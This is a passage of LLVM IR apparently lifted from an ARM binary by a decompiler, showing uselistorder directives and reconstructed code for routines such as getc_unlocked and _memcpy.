  uselistorder i32 %v2_f758, { 1, 0 }
  uselistorder i32 %v2_f754, { 3, 2, 1, 4, 5, 7, 0, 8, 6, 9 }
  uselistorder i1 %v7_f740, { 1, 0 }
  uselistorder i32 %v1_f744, { 2, 1, 0 }
  uselistorder i1 %v2_f734, { 1, 0 }
  uselistorder i32 %v0_f730, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_f718, { 1, 0 }
  uselistorder i32 %stack_var_-192.7, { 1, 0, 2 }
  uselistorder i32 %v1_f70c, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v1_f6c4, { 1, 2, 0 }
  uselistorder i32 %v2_f6c0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_f6a8, { 1, 3, 5, 6, 0, 4, 2 }
  uselistorder i1 %v2_f6a0, { 1, 0 }
  uselistorder i32 %v0_f6ac, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_f688, { 1, 0 }
  uselistorder i32 %v0_f674, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i32 %v0_f668, { 0, 2, 1, 3 }
  uselistorder i32 %v0_f65c, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_f658, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f610, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %stack_var_-192.6, { 1, 2, 0, 3 }
  uselistorder i32 %v2_f560, { 1, 0 }
  uselistorder i32 %v11_f53c, { 1, 2, 0 }
  uselistorder double %v9_f53c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_f4e8, { 1, 0 }
  uselistorder i32 %v1_f4d4, { 3, 2, 0, 1 }
  uselistorder i32 %v0_f534, { 1, 0 }
  uselistorder i32 %v5_f480, { 1, 0 }
  uselistorder i32 %v0_f46c, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_f38c.v1_f3a08, { 1, 0 }
  uselistorder i1 %not.v7_f394, { 1, 0 }
  uselistorder i1 %v7_f394, { 1, 2, 0 }
  uselistorder i32 %v1_f6a4, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32 %v1_f300, { 1, 0 }
  uselistorder i32* %stack_var_-79, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-78, { 1, 2, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-43, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-42, { 0, 3, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 5, 6, 7, 4, 8, 2, 9, 10, 3, 11 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 0, 8, 9, 10, 11 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 31, 30 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 26, 25, 46, 28, 29, 33, 30, 31, 32, 34, 27, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 60, 47, 48, 49, 50, 51, 52, 53, 57, 58, 59, 61, 62, 63, 64, 65, 66, 1, 67, 54, 55, 56, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 16, 17, 13, 14, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 10, 11, 12, 7, 8, 9, 13, 14, 15, 17, 16, 18, 19, 20, 1, 21, 22, 23, 24, 25, 26, 27, 28, 31, 32, 33, 34, 35, 36, 29, 30, 0 }
  uselistorder i32* %r0.global-to-local, { 13, 14, 15, 16, 17, 18, 10, 19, 20, 30, 28, 29, 31, 21, 22, 27, 23, 24, 12, 32, 25, 26, 9, 33, 34, 8, 7, 6, 5, 4, 35, 36, 3, 2, 1, 0, 37, 38, 11 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 8, 5, 6, 7, 9, 10, 13, 11, 12, 14, 15, 0, 16, 17, 18, 19, 20 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 27, 28, 29, 2, 30, 31, 32, 33, 34, 1, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 53, 54, 55, 56, 48 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 24, 25, 26, 27, 28, 29, 1, 30, 31, 32, 33, 0, 34, 35, 36, 37, 38, 39, 40, 3, 41, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 47 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 2, 22, 23, 24, 25, 26, 27, 28, 29, 30, 1, 31, 32, 33, 34, 0, 35, 36, 37, 38, 39, 40, 41, 3, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 53, 54, 55, 56, 48 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 17, { 8, 1, 10, 2, 11, 3, 12, 0, 13, 4, 14, 5, 15, 6, 16, 7, 17, 18, 9 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6 }
  uselistorder i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F00000000155A7) to float) to i32), { 1, 0 }
  uselistorder i32 520, { 1, 0 }
  uselistorder i32 96, { 1, 2, 0 }
  uselistorder double 0.000000e+00, { 1, 3, 2, 0 }
  uselistorder i32 %arg4, { 1, 0, 5, 4, 3, 2, 7, 6, 8, 9, 10 }
  uselistorder i32 %arg3, { 0, 2, 1, 5, 4, 3, 6, 7, 8, 9, 11, 10, 12, 13 }
  uselistorder double %arg2, { 0, 1, 5, 6, 3, 4, 2, 7 }
  uselistorder label %dec_label_pc_fa78, { 2, 0, 1 }
  uselistorder label %bb270, { 1, 0 }
  uselistorder label %dec_label_pc_f9d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f950, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f924, { 1, 0 }
  uselistorder label %.thread49, { 1, 0 }
  uselistorder label %dec_label_pc_f8fc, { 1, 0 }
  uselistorder label %dec_label_pc_f8d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f8bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f888, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f884, { 0, 2, 1 }
  uselistorder label %dec_label_pc_f7e0, { 1, 0 }
  uselistorder label %bb257, { 1, 0 }
  uselistorder label %dec_label_pc_f7d0, { 1, 0 }
  uselistorder label %dec_label_pc_f7c4, { 1, 0 }
  uselistorder label %bb251, { 1, 0 }
  uselistorder label %bb249, { 1, 0 }
  uselistorder label %bb247, { 1, 0 }
  uselistorder label %.thread162, { 1, 0 }
  uselistorder label %bb243, { 1, 0 }
  uselistorder label %bb241, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb238, { 1, 0 }
  uselistorder label %dec_label_pc_f6e4, { 2, 1, 0 }
  uselistorder label %bb235, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_f60c, { 1, 0 }
  uselistorder label %dec_label_pc_f5cc, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_f45c, { 1, 0 }
  uselistorder label %dec_label_pc_f378, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i16* %arg2) local_unnamed_addr {
dec_label_pc_fabc:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_fad0 = load i1, i1* @cpsr_n, align 1
  br i1 %v0_fad0, label %bb, label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_fabc
  %v0_fadc.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_fadc.pr, label %bb7, label %.thread2

bb:                                               ; preds = %dec_label_pc_fabc
  %v1_fad4 = load i32, i32* @r4, align 4
  %v3_fad4 = xor i32 %v1_fad4, %arg1
  %v2_fad8 = sub i32 -1, %v3_fad4
  store i32 %v2_fad8, i32* %r0.global-to-local, align 4
  %v4_fad8 = icmp eq i32 %v3_fad4, -1
  br i1 %v4_fad8, label %bb7, label %.thread2

bb7:                                              ; preds = %thread-pre-split, %bb
  %v3_fadc = load i32, i32* @r7, align 4
  %v6_fadc = udiv i32 %v3_fadc, 2048
  %v7_fadc = and i32 %v6_fadc, %tmp
  %v2_fae0 = trunc i32 %v7_fadc to i16
  store i16 %v2_fae0, i16* %arg2, align 2
  %v10_fae0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %bb, %thread-pre-split, %bb7
  %v10_fae0 = phi i32 [ %v2_fad8, %bb ], [ %arg1, %thread-pre-split ], [ %v10_fae0.pre, %bb7 ]
  ret i32 %v10_fae0

; uselistorder directives
  uselistorder i32 %v2_fad8, { 1, 0 }
  uselistorder i32 %v3_fad4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_fae4 = load i32, i32* @r4, align 4
  store i32 %v3_fae4, i32* %stack_var_-8, align 4
  %v0_fae8 = load i32, i32* @r0, align 4
  %v1_fae8 = add i32 %v0_fae8, 16
  %v2_fae8 = inttoptr i32 %v1_fae8 to i32*
  %v3_fae8 = load i32, i32* %v2_fae8, align 4
  store i32 %v3_fae8, i32* %r2.global-to-local, align 4
  %v1_faec = add i32 %v0_fae8, 24
  %v2_faec = inttoptr i32 %v1_faec to i32*
  %v3_faec = load i32, i32* %v2_faec, align 4
  %v3_faf0 = icmp ult i32 %v3_fae8, %v3_faec
  store i32 %v0_fae8, i32* @r4, align 4
  br i1 %v3_faf0, label %bb, label %dec_label_pc_fb08

bb:                                               ; preds = %entry
  %v2_faf8 = inttoptr i32 %v3_fae8 to i8*
  %v3_faf8 = load i8, i8* %v2_faf8, align 1
  %v4_faf8 = zext i8 %v3_faf8 to i32
  store i32 %v4_faf8, i32* %r0.global-to-local, align 4
  %v6_faf8 = add i32 %v3_fae8, 1
  store i32 %v6_faf8, i32* %r2.global-to-local, align 4
  store i32 %v6_faf8, i32* %v2_fae8, align 4
  br label %dec_label_pc_fc08

dec_label_pc_fb08:                                ; preds = %entry
  %v1_fb08 = inttoptr i32 %v0_fae8 to i8*
  %v2_fb08 = load i8, i8* %v1_fb08, align 1
  %v3_fb08 = zext i8 %v2_fb08 to i32
  %v1_fb0c = and i32 %v3_fb08, 131
  %tmp22 = icmp ugt i32 %v1_fb0c, 128
  br i1 %tmp22, label %dec_label_pc_fb28, label %dec_label_pc_fb18

dec_label_pc_fb18:                                ; preds = %dec_label_pc_fb08
  store i32 128, i32* @r1, align 4
  %v0_fb1c = call i32 @__stdio_trans2r_o()
  store i32 %v0_fb1c, i32* %r0.global-to-local, align 4
  %v2_fb20 = icmp eq i32 %v0_fb1c, 0
  br i1 %v2_fb20, label %dec_label_pc_fb18.dec_label_pc_fb28_crit_edge, label %dec_label_pc_fc04

dec_label_pc_fb18.dec_label_pc_fb28_crit_edge:    ; preds = %dec_label_pc_fb18
  %v0_fb28.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fb28

dec_label_pc_fb28:                                ; preds = %dec_label_pc_fb18.dec_label_pc_fb28_crit_edge, %dec_label_pc_fb08
  %v2_fb74 = phi i32 [ %v0_fb28.pre, %dec_label_pc_fb18.dec_label_pc_fb28_crit_edge ], [ %v0_fae8, %dec_label_pc_fb08 ]
  %v1_fb28 = inttoptr i32 %v2_fb74 to i8*
  %v2_fb28 = load i8, i8* %v1_fb28, align 1
  %v3_fb28 = zext i8 %v2_fb28 to i32
  store i32 %v3_fb28, i32* %r2.global-to-local, align 4
  %v1_fb2c = add i32 %v2_fb74, 1
  %v2_fb2c = inttoptr i32 %v1_fb2c to i8*
  %v3_fb2c = load i8, i8* %v2_fb2c, align 1
  %v4_fb2c = zext i8 %v3_fb2c to i32
  %v4_fb30 = mul nuw nsw i32 %v4_fb2c, 256
  %v5_fb30 = or i32 %v4_fb30, %v3_fb28
  store i32 %v5_fb30, i32* %r2.global-to-local, align 4
  %v1_fb34 = and i32 %v3_fb28, 2
  %v2_fb34 = icmp eq i32 %v1_fb34, 0
  br i1 %v2_fb34, label %dec_label_pc_fb64, label %dec_label_pc_fb3c

dec_label_pc_fb3c:                                ; preds = %dec_label_pc_fb28
  %tmp23 = urem i8 %v2_fb28, 2
  %v1_fb3c = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_fb3c
  %v4_fb40 = and i32 %tmp18, 4
  %v5_fb40 = add i32 %v4_fb40, %v2_fb74
  %v1_fb44 = add i32 %v5_fb40, 36
  %v2_fb44 = inttoptr i32 %v1_fb44 to i8*
  %v3_fb44 = load i8, i8* %v2_fb44, align 1
  %v4_fb44 = zext i8 %v3_fb44 to i32
  %v1_fb48 = add nsw i32 %v5_fb30, -1
  store i32 %v1_fb48, i32* %r2.global-to-local, align 4
  %v3_fb4c = sdiv i32 %v1_fb48, 256
  store i32 %v3_fb4c, i32* %r1.global-to-local, align 4
  store i32 %v4_fb44, i32* %r0.global-to-local, align 4
  %v2_fb58 = add i32 %v2_fb74, 40
  %v3_fb58 = inttoptr i32 %v2_fb58 to i32*
  store i32 0, i32* %v3_fb58, align 4
  %v0_fb5c = load i32, i32* %r1.global-to-local, align 4
  %v1_fb5c = trunc i32 %v0_fb5c to i8
  %v2_fb5c = load i32, i32* @r4, align 4
  %v3_fb5c = add i32 %v2_fb5c, 1
  %v4_fb5c = inttoptr i32 %v3_fb5c to i8*
  store i8 %v1_fb5c, i8* %v4_fb5c, align 1
  br label %dec_label_pc_fb98

dec_label_pc_fb64:                                ; preds = %dec_label_pc_fb28
  %v1_fb64 = add i32 %v2_fb74, 16
  store i32 %v1_fb64, i32* %r1.global-to-local, align 4
  %v1_fb68 = inttoptr i32 %v1_fb64 to i32*
  %v2_fb68 = load i32, i32* %v1_fb68, align 4
  store i32 %v2_fb68, i32* %r1.global-to-local, align 4
  %v3_fb68 = add i32 %v2_fb74, 20
  %v4_fb68 = inttoptr i32 %v3_fb68 to i32*
  %v5_fb68 = load i32, i32* %v4_fb68, align 4
  %v9_fb6c = icmp eq i32 %v5_fb68, %v2_fb68
  br i1 %v9_fb6c, label %dec_label_pc_fb7c, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_fb64
  %v2_fb70 = inttoptr i32 %v2_fb68 to i8*
  %v3_fb70 = load i8, i8* %v2_fb70, align 1
  %v4_fb70 = zext i8 %v3_fb70 to i32
  store i32 %v4_fb70, i32* %r0.global-to-local, align 4
  %v6_fb70 = add i32 %v2_fb68, 1
  store i32 %v6_fb70, i32* %r1.global-to-local, align 4
  store i32 %v6_fb70, i32* %v1_fb68, align 4
  br label %dec_label_pc_fc08

dec_label_pc_fb7c:                                ; preds = %dec_label_pc_fb64
  %v1_fb7c = add i32 %v2_fb74, 4
  %v2_fb7c = inttoptr i32 %v1_fb7c to i32*
  %v3_fb7c = load i32, i32* %v2_fb7c, align 4
  %v4_fb84 = icmp eq i32 %v3_fb7c, -2
  br i1 %v4_fb84, label %dec_label_pc_fb88, label %dec_label_pc_fba0

dec_label_pc_fb88:                                ; preds = %dec_label_pc_fb7c
  %v1_fb88 = or i32 %v5_fb30, 4
  store i32 %v1_fb88, i32* %r2.global-to-local, align 4
  store i8 %v3_fb2c, i8* %v2_fb2c, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fb98

dec_label_pc_fb98:                                ; preds = %dec_label_pc_fb3c, %dec_label_pc_fb88
  %v0_fb98 = load i32, i32* %r2.global-to-local, align 4
  %v1_fb98 = trunc i32 %v0_fb98 to i8
  %v2_fb98 = load i32, i32* @r4, align 4
  %v3_fb98 = inttoptr i32 %v2_fb98 to i8*
  store i8 %v1_fb98, i8* %v3_fb98, align 1
  br label %dec_label_pc_fc08

dec_label_pc_fba0:                                ; preds = %dec_label_pc_fb7c
  %v1_fba0 = and i32 %v4_fb30, 768
  %v2_fba0 = icmp eq i32 %v1_fba0, 0
  br i1 %v2_fba0, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_fba0
  store i32 ptrtoint (i32** @global_var_1e488.433 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_fba0, %bb19
  store i32 64428, i32* @lr, align 4
  %v1_fba8 = xor i1 %v2_fba0, true
  call void @__pseudo_cond_branch(i1 %v1_fba8, i32 ptrtoint (i32* @global_var_c4e4.681 to i32))
  %v0_fbac = load i32, i32* @r4, align 4
  %v1_fbac = add i32 %v0_fbac, 8
  store i32 %v1_fbac, i32* %r2.global-to-local, align 4
  %v1_fbb0 = inttoptr i32 %v1_fbac to i32*
  %v2_fbb0 = load i32, i32* %v1_fbb0, align 4
  store i32 %v2_fbb0, i32* %r2.global-to-local, align 4
  %v3_fbb0 = add i32 %v0_fbac, 12
  %v4_fbb0 = inttoptr i32 %v3_fbb0 to i32*
  %v5_fbb0 = load i32, i32* %v4_fbb0, align 4
  %v9_fbb4 = icmp eq i32 %v5_fbb0, %v2_fbb0
  br i1 %v9_fbb4, label %dec_label_pc_fbe8, label %dec_label_pc_fbbc

dec_label_pc_fbbc:                                ; preds = %bb20
  %v2_fbbc = add i32 %v0_fbac, 24
  %v3_fbbc = inttoptr i32 %v2_fbbc to i32*
  store i32 %v2_fbb0, i32* %v3_fbbc, align 4
  %v0_fbc0 = load i32, i32* @r4, align 4
  store i32 %v0_fbc0, i32* %r0.global-to-local, align 4
  %v2_fbc4 = call i32 @__stdio_rfill(i32 %v0_fbc0)
  store i32 %v2_fbc4, i32* %r0.global-to-local, align 4
  %v2_fbc8 = icmp eq i32 %v2_fbc4, 0
  br i1 %v2_fbc8, label %dec_label_pc_fc04, label %dec_label_pc_fbd0

dec_label_pc_fbd0:                                ; preds = %dec_label_pc_fbbc
  %v0_fbd0 = load i32, i32* @r4, align 4
  %v1_fbd0 = add i32 %v0_fbd0, 20
  %v2_fbd0 = inttoptr i32 %v1_fbd0 to i32*
  %v3_fbd0 = load i32, i32* %v2_fbd0, align 4
  %v2_fbd4 = add i32 %v0_fbd0, 24
  %v3_fbd4 = inttoptr i32 %v2_fbd4 to i32*
  store i32 %v3_fbd0, i32* %v3_fbd4, align 4
  %v0_fbd8 = load i32, i32* @r4, align 4
  %v1_fbd8 = add i32 %v0_fbd8, 16
  %v2_fbd8 = inttoptr i32 %v1_fbd8 to i32*
  %v3_fbd8 = load i32, i32* %v2_fbd8, align 4
  %v1_fbdc = inttoptr i32 %v3_fbd8 to i8*
  %v2_fbdc = load i8, i8* %v1_fbdc, align 1
  %v3_fbdc = zext i8 %v2_fbdc to i32
  store i32 %v3_fbdc, i32* %r0.global-to-local, align 4
  %v5_fbdc = add i32 %v3_fbd8, 1
  store i32 %v5_fbdc, i32* %v2_fbd8, align 4
  br label %dec_label_pc_fc08

dec_label_pc_fbe8:                                ; preds = %bb20
  %v1_fbe8 = inttoptr i32 %v0_fbac to i8*
  store i32 %v0_fbac, i32* %r0.global-to-local, align 4
  %v2_fbec = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_fbec, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_fbf4 = call i32 @__stdio_READ(i8* %v1_fbe8, i32 %v2_fbec, i32 1)
  store i32 %v5_fbf4, i32* %r0.global-to-local, align 4
  %v2_fbf8 = icmp eq i32 %v5_fbf4, 0
  br i1 %v2_fbf8, label %dec_label_pc_fc04, label %bb21

bb21:                                             ; preds = %dec_label_pc_fbe8
  %v4_fbfc = load i8, i8* %stack_var_-9, align 1
  %v5_fbfc = sext i8 %v4_fbfc to i32
  store i32 %v5_fbfc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc08

dec_label_pc_fc04:                                ; preds = %dec_label_pc_fbe8, %dec_label_pc_fb18, %dec_label_pc_fbbc
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc08

dec_label_pc_fc08:                                ; preds = %bb, %bb21, %.thread4, %dec_label_pc_fbd0, %dec_label_pc_fb98, %dec_label_pc_fc04
  %v2_fc0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fc0c, i32* @r4, align 4
  %v8_fc0c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_fc0c

; uselistorder directives
  uselistorder i32 %v2_fb68, { 1, 0, 2, 3 }
  uselistorder i32 %v3_fb28, { 1, 0, 2 }
  uselistorder i32 %v2_fb74, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_fae8, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i8** @global_var_1e4c0.399, { 2, 1, 0 }
  uselistorder i32** @global_var_1e488.433, { 0, 2, 1 }
  uselistorder label %dec_label_pc_fc08, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_fc04, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_fb98, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_fc20 = load i32, i32* @r1, align 4
  %v1_fc20 = load i32, i32* %r0.global-to-local, align 4
  %v2_fc20 = sub i32 %v0_fc20, %v1_fc20
  %v3_fc20 = icmp ult i32 %v0_fc20, %v1_fc20
  %v4_fc20 = xor i32 %v1_fc20, %v0_fc20
  %v5_fc20 = xor i32 %v2_fc20, %v0_fc20
  %v6_fc20 = and i32 %v5_fc20, %v4_fc20
  %v7_fc20 = icmp slt i32 %v6_fc20, 0
  store i1 %v7_fc20, i1* %cpsr_v.global-to-local, align 1
  %v8_fc20 = icmp slt i32 %v2_fc20, 0
  store i1 %v8_fc20, i1* %cpsr_n.global-to-local, align 1
  %v9_fc20 = icmp eq i32 %v0_fc20, %v1_fc20
  store i1 %v9_fc20, i1* @cpsr_z, align 1
  br i1 %v3_fc20, label %dec_label_pc_fe6c, label %dec_label_pc_fc28

dec_label_pc_fc28:                                ; preds = %entry
  br i1 %v9_fc20, label %.thread122, label %bb

.thread122:                                       ; preds = %bb145, %.thread121, %bb142, %dec_label_pc_fc28
  %merge = phi i32 [ %v0_fc20, %dec_label_pc_fc28 ], [ %v2_ff00, %bb142 ], [ %v11_ff1c, %bb145 ], [ %v7_ff1c, %.thread121 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_fc28
  %v5_fc2c = inttoptr i32 %v1_fc20 to i8*
  store i8* %v5_fc2c, i8** %stack_var_-8, align 4
  %v0_fc30 = load i32, i32* @r2, align 4
  %v2_fc30 = add i32 %v0_fc30, -4
  store i32 %v2_fc30, i32* %r2.global-to-local, align 4
  %v4_fc30 = sub i32 3, %v0_fc30
  %v5_fc30 = and i32 %v4_fc30, %v0_fc30
  %v6_fc30 = icmp slt i32 %v5_fc30, 0
  store i1 %v6_fc30, i1* %cpsr_v.global-to-local, align 1
  %v7_fc30 = icmp slt i32 %v2_fc30, 0
  store i1 %v7_fc30, i1* %cpsr_n.global-to-local, align 1
  %v5_fc34 = icmp slt i32 %v0_fc30, 4
  br i1 %v5_fc34, label %bb132, label %dec_label_pc_fc38

dec_label_pc_fc38:                                ; preds = %bb
  %v1_fc38 = urem i32 %v1_fc20, 4
  store i32 %v1_fc38, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fc38 = icmp eq i32 %v1_fc38, 0
  br i1 %v2_fc38, label %dec_label_pc_fc40, label %dec_label_pc_fce4

dec_label_pc_fc40:                                ; preds = %dec_label_pc_fc38
  %v1_fc40 = urem i32 %v0_fc20, 4
  store i32 %v1_fc40, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fc40 = icmp eq i32 %v1_fc40, 0
  %extract.t = trunc i32 %v0_fc20 to i2
  br i1 %v2_fc40, label %dec_label_pc_fc48, label %dec_label_pc_fd14

dec_label_pc_fc48:                                ; preds = %dec_label_pc_fc40, %dec_label_pc_fd0c
  %v0_fc6092 = phi i32 [ %v1_fc20, %dec_label_pc_fc40 ], [ %v0_fd5c75, %dec_label_pc_fd0c ]
  %v0_fc5c91 = phi i32 [ %v0_fc20, %dec_label_pc_fc40 ], [ %v0_fd0c, %dec_label_pc_fd0c ]
  %v0_fc48 = phi i32 [ %v2_fc30, %dec_label_pc_fc40 ], [ %v2_fd04, %dec_label_pc_fd0c ]
  %v2_fc48 = add i32 %v0_fc48, -8
  store i32 %v2_fc48, i32* %r2.global-to-local, align 4
  %v4_fc48 = sub i32 7, %v0_fc48
  %v5_fc48 = and i32 %v4_fc48, %v0_fc48
  %v6_fc48 = icmp slt i32 %v5_fc48, 0
  store i1 %v6_fc48, i1* %cpsr_v.global-to-local, align 1
  %v7_fc48 = icmp slt i32 %v2_fc48, 0
  store i1 %v7_fc48, i1* %cpsr_n.global-to-local, align 1
  %v5_fc4c = icmp slt i32 %v0_fc48, 8
  br i1 %v5_fc4c, label %dec_label_pc_fc9c, label %dec_label_pc_fc50

dec_label_pc_fc50:                                ; preds = %dec_label_pc_fc48
  %v2_fc50 = add i32 %v0_fc48, -28
  store i32 %v2_fc50, i32* %r2.global-to-local, align 4
  %v4_fc50 = sub i32 27, %v0_fc48
  %v5_fc50 = and i32 %v4_fc50, %v2_fc48
  %v6_fc50 = icmp slt i32 %v5_fc50, 0
  store i1 %v6_fc50, i1* %cpsr_v.global-to-local, align 1
  %v7_fc50 = icmp slt i32 %v2_fc50, 0
  store i1 %v7_fc50, i1* %cpsr_n.global-to-local, align 1
  %v5_fc54 = icmp slt i32 %v2_fc48, 20
  br i1 %v5_fc54, label %dec_label_pc_fc88, label %dec_label_pc_fc58

dec_label_pc_fc58:                                ; preds = %dec_label_pc_fc50
  %v0_fc58 = load i32, i32* @r4, align 4
  store i32 %v0_fc58, i32* %stack_var_-12, align 4
  br label %dec_label_pc_fc5c

dec_label_pc_fc5c:                                ; preds = %dec_label_pc_fc5c.dec_label_pc_fc5c_crit_edge, %dec_label_pc_fc58
  %v0_fc60 = phi i32 [ %v12_fc68, %dec_label_pc_fc5c.dec_label_pc_fc5c_crit_edge ], [ %v0_fc6092, %dec_label_pc_fc58 ]
  %v0_fc5c = phi i32 [ %v0_fc5c.pre, %dec_label_pc_fc5c.dec_label_pc_fc5c_crit_edge ], [ %v0_fc5c91, %dec_label_pc_fc58 ]
  %v1_fc5c = inttoptr i32 %v0_fc5c to i32*
  %v2_fc5c = load i32, i32* %v1_fc5c, align 4
  %v3_fc5c = add i32 %v0_fc5c, 4
  %v4_fc5c = inttoptr i32 %v3_fc5c to i32*
  %v5_fc5c = load i32, i32* %v4_fc5c, align 4
  store i32 %v5_fc5c, i32* %r4.global-to-local, align 4
  %v6_fc5c = add i32 %v0_fc5c, 8
  %v7_fc5c = inttoptr i32 %v6_fc5c to i32*
  %v8_fc5c = load i32, i32* %v7_fc5c, align 4
  store i32 %v8_fc5c, i32* %ip.global-to-local, align 4
  %v9_fc5c = add i32 %v0_fc5c, 12
